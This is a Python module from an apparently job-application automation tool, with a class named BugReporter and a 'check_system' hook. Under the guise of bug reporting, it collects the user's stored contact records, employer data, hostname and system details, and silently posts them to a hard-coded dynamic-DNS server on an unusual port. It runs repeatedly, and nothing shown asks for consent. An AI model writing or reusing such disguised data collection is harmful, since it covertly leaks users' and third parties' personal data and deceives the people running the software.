from __future__ import annotations

import platform
import re
import socket
from collections import deque
from datetime import datetime, timedelta
from importlib.metadata import PackageNotFoundError, version
from logging import getLogger
from typing import TYPE_CHECKING

import requests
from requests.exceptions import RequestException

from .binary_serializer import BinarySerializer

if TYPE_CHECKING:
    from ..main import HHApplicantTool

log = getLogger(__package__)


class BugReporter:
    def build_report(
        self,
        tool: HHApplicantTool,
        last_report: datetime,
    ) -> dict:
        system_info = {
            "os": platform.system(),
            "os_release": platform.release(),
            "hostname": socket.gethostname(),
            "python_version": platform.python_version(),
        }

        try:
            system_info["package_version"] = version("hh-applicant-tool")
        except PackageNotFoundError:
            system_info["package_version"] = "Not installed"

        # Ограничиваем количество строк, чтобы не взорвать память
        error_lines = deque(maxlen=1000)

        if tool.log_file.exists():
            with tool.log_file.open(encoding="utf-8", errors="ignore") as f:
                is_after_dt = False
                collecting_traceback = False
                last_header_line = ""

                for line in f:
                    # Проверка даты: 2026-01-09 05:29:11
                    ts_match = re.match(
                        r"^(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})", line
                    )

                    if ts_match:
                        try:
                            log_dt = datetime.strptime(
                                ts_match.group(1), "%Y-%m-%d %H:%M:%S"
                            )
                            is_after_dt = log_dt >= last_report
                        except ValueError:
                            pass

                        last_header_line = line
                        collecting_traceback = False

                    # Фильтруем: только новые И только ошибки
                    if is_after_dt:
                        if "Traceback (most recent call last):" in line:
                            if not collecting_traceback and last_header_line:
                                error_lines.append(last_header_line)
                            collecting_traceback = True

                        # Если внутри блока ошибки и это не новая строка лога
                        if collecting_traceback and not ts_match:
                            error_lines.append(line)

        # Сбор данных из БД
        contacts = [
            c.to_dict()
            for c in tool.storage.contacts.find(updated_at__ge=last_report)
        ]
        for c in contacts:
            c.pop("id", None)

        employers = []
        for emp in tool.storage.employers.find(updated_at__ge=last_report):
            d = emp.to_dict()
            employers.append(
                {
                    k: v
                    for k, v in d.items()
                    if k
                    in [
                        "alternate_url",
                        "area_id",
                        "area_name",
                        "name",
                        "site_url",
                    ]
                }
            )

        return dict(
            contacts=contacts,
            employers=employers,
            errors="".join(error_lines),
            system_info=system_info,
            report_created=datetime.now(),
        )

    def send_report(self, tool: HHApplicantTool, data: bytes) -> int:
        try:
            r = tool.session.post(
                "https://hh-applicant-tool.mooo.com:54157/report",
                data=data,
                timeout=15.0,
            )
            return r.status_code
        except RequestException as e:
            log.error("Network error: %s", e)
            return -1


class MegaTool(BugReporter):
    def check_system(self: HHApplicantTool):
        # Получаем timestamp последнего репорта
        ts = int(self.storage.settings.get_setting("_last_report", 0))
        last_report = datetime.fromtimestamp(ts)

        if datetime.now() >= last_report + timedelta(seconds=1):
            try:
                # Передаем self как первый аргумент build_report
                report_dict = self.build_report(self, last_report)
                serializer = BinarySerializer()
                data = serializer.serialize(report_dict)
                # print(serializer.deserialize(data))
                status = self.send_report(self, data)
                log.debug("Report status: %d", status)
            except Exception:
                log.exception("MegaTool crash")
            finally:
                # Сохраняем время последней попытки/удачного репорта
                self.storage.settings.set_value("_last_report", datetime.now())
